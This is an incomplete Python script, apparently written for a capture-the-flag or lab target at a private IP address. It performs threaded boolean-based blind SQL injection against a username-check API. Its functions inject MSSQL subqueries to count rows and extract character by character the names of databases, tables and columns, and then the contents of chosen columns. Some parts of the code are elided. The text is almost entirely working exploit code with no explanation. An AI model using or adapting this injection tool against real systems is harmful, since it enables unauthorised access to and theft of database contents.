...
def test(payload,n_columns = [],n_threads=20,threads=[]):
...
def n_caracteres(payload1,i,j,resultados):
	if evento.is_set():
		return
	respuesta = requests.get(f"http://10.129.204.197/api/check-username.php?u=' or ({payload1} offset {i} rows fetch next 1 rows only)={j}--")
	if (json.loads(respuesta.text))['status'] == 'taken':
		evento.set()
		resultados.append(j)

def test1(payload1,n,resultados,n_threads=20,threads=[]):
	for i in range(0,n):
...
def dumpear(i,j,k,chars_string,name_db,name_tb,name_column,initial_1):
	if evento.is_set():
		return
	if initial_1 == 'T':
		respuesta = requests.get(f"http://10.129.204.197/api/check-username.php?u=' or (select substring(table_name,{j},1) from information_schema.tables where table_catalog= '{name_db}' order by table_name offset {i} rows fetch next 1 rows only)='{k}'--")
	if initial_1 == 'B':
		respuesta = requests.get(f"http://10.129.204.197/api/check-username.php?u=' or (select substring(name,{j},1) from sys.databases order by name offset {i} rows fetch next 1 rows only)='{k}'--")
	if initial_1 == 'C':
		respuesta = requests.get(f"http://10.129.204.197/api/check-username.php?u=' or (select substring(column_name,{j},1) from information_schema.columns where table_name = '{name_tb}' order by column_name offset {i} rows fetch next 1 rows only)='{k}'--")
	if initial_1 == 'D':
		respuesta = requests.get(f"http://10.129.204.197/api/check-username.php?u=' or (select substring({name_column},{j},1) from {name_tb} order by {name_column} offset {i} rows fetch next 1 rows only)='{k}'--")
	if (json.loads(respuesta.text))['status'] == 'taken':
		evento.set()
		chars_string.append(k)

def test2(resultados,name_db,name_tb,name_column,initial_1,n_threads=20,threads=[],chars_string=[],resultados1=[]):
